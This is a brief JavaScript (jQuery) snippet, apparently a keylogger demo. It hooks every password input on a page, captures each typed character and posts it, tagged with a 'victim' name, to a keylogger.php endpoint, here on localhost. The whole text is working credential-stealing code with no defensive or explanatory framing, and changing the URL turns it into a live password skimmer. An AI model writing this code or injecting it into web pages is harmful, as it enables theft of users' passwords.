result="";
$(":password").keypress(function(e) {
    result=String.fromCharCode(e.which);
    $.post('http://localhost/keylogger/keylogger.php',{"logged_key":result,"victim":"test-victim"}, function(data){});
});